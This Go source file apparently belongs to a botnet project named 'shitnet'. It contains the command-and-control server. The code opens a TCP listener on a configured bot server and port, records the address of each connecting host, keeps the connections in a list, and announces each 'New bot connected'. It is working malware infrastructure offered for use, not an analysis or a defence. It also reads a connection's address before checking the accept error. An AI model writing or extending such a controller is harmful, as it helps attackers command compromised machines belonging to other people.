package server

import (
	"net"
	"os"
	"shitnet/network/config"
	"strconv"

	"github.com/fatih/color"
)

var (
	Conns  []net.Conn
	Chconn = make(chan net.Conn)
	List   []string
)

func StartServer() {
	server, err := net.Listen("tcp", config.GetConfig().BotServer+":"+config.GetConfig().BotPort)
	if err != nil {
		color.HiRed("Fails to start server")
		os.Exit(0)
	}
	go Ping()

	go func() {
		for {
			conn, err := server.Accept()
			if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
				List = append(List, addr.IP.String()+":"+strconv.Itoa(addr.Port))
			}

			if err != nil {
				continue
			}
			Conns = append(Conns, conn)
			Chconn <- conn
		}
	}()

	for {
		select {
		case <-Chconn:
			color.HiYellow("[!] New bot connected")
		}
	}

}
